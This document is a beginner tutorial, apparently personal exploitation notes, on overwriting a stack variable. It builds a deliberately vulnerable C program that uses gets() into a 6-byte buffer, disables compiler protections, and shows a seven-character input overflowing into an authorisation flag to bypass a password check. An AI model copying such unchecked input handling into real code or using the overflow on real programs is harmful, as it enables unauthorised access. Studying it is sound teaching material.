# Stack Variable Overwrite

---
## Source Code
```c
// vuln.c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);

    if(strcmp(password, "pass") == 0)
    {
        printf("Correct Password!\n");
        authorised = 1;
    }
    else
    {
        printf("Incorrect Password!\n");
    }

    if(authorised)
    {
        printf("Successfully logged in as Admin (authorised=%d) :)\n", authorised);
    }else{
		printf("Failed to log in as Admin (authorised=%d) :(\n", authorised);
	}

    return 0;
}
```

---

## Compile
```bash
gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32
```

#### Output
```text
vuln.c: In function ‘main’:
vuln.c:11:5: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
   11 |     gets(password);
      |     ^~~~
      |     fgets
/usr/bin/ld: /tmp/ccZwi67X.o: in function `main':
vuln.c:(.text+0x3e): warning: the `gets' function is dangerous and should not be used.
```

### Compile Information
```bash
checksec vuln
```

#### Output
```text
[*] '/home/s/Binary-Exploitation-Notes/001_Overwriting_Stack_Variable_Part_1/vuln'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

### Short Explaination

1. `Stack: No canary found` is based on the command `-fno-stack-protector`, which is disable the security mechanism to detect stake overflow.
2. `NX: NX unknown - GNU_STACK missing` is based on the command `-z execstack`, which is doesn't marks certain area of memory as non-executable.
3. `PIE: No PIE (0x8048000)` is based on the command `-no-pie`, which is not load in the memory randomly, but follow the memory address `(0x8048000)`.

---

## Program Investigate

### Run
```bash
./vuln
```

#### Output
```text
Enter admin password:
aaaaaa
Incorrect Password!
Failed to log in as Admin (authorised=0) :(
```

Based on the output, the program need user to enter the admininistrator password. The user try using **"aaaaaa"**, and the password is error. Now, try with a tools called **"ltrace"** to identify what going on for the program while running.

### Run with ltrace
```bash
ltrace ./vuln
```

#### Output
```text
__libc_start_main(0x80491a6, 1, 0xffc99424, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password:
)                                            = 23
gets(0xffc99346, 0xf7f71f90, 0xf7d314be, 0x80491bdtest
)                       = 0xffc99346
strcmp("test", "pass")                                                    = 1
puts("Incorrect Password!"Incorrect Password!
)                                               = 20
printf("Failed to log in as Admin (autho"..., 0Failed to log in as Admin (authorised=0) :(
)                          = 44
+++ exited (status 0) +++
```

Based on the output of `ltrace`, the program is compare the **"test"** strings with **"pass"**, if incorrect then print **"Incorrect Password!"** and **"Failed to log in as Admin (authorised=0) :("**.

### Run with ltrace Again (Output)
```
__libc_start_main(0x80491a6, 1, 0xffa8c2c4, 0 <unfinished ...>
puts("Enter admin password: "Enter admin password:
)                                            = 23
gets(0xffa8c1e6, 0xf7f53f90, 0xf7d134be, 0x80491bdpass
)                       = 0xffa8c1e6
strcmp("pass", "pass")                                                    = 0
puts("Correct Password!"Correct Password!
)                                                 = 18
printf("Successfully logged in as Admin "..., 1Successfully logged in as Admin (authorised=1) :)
)                          = 50
+++ exited (status 0) +++
```

Now based on the output of `ltrace`, the program is compare the **"pass"** strings with **"pass"**, it will print **"Correct Password!"** and **"Successfully logged in as Admin (authorised=1) :)"**.

## Buffer Overflow
```bash
./vuln
```

### Output
```
Enter admin password:
AAAAAAA
Incorrect Password!
Successfully logged in as Admin (authorised=65) :)
```

After we flow the **7** character **"A"** to the program, even the password is wrong but it still success to login as a Admin, and the `authorised` variable is overwrite to the ASCII character **"A"** code, which is represent in Decimal form.

## Code Analyzing
```c
#include <stdio.h>
#include <string.h>

int main(void)
{
    char password[6];
    int authorised = 0;

    printf("Enter admin password: \n");
    gets(password);
```

The `gets()` function is the vulnerability, because it doesn't check the size of getting string to pass to the variable, `password` which only have 6 bytes capability. If the size of input strings is over 6 bytes, it will overflow to next stack, which is `authorised` because of the `authorised` is declare after the `password` in the stack.
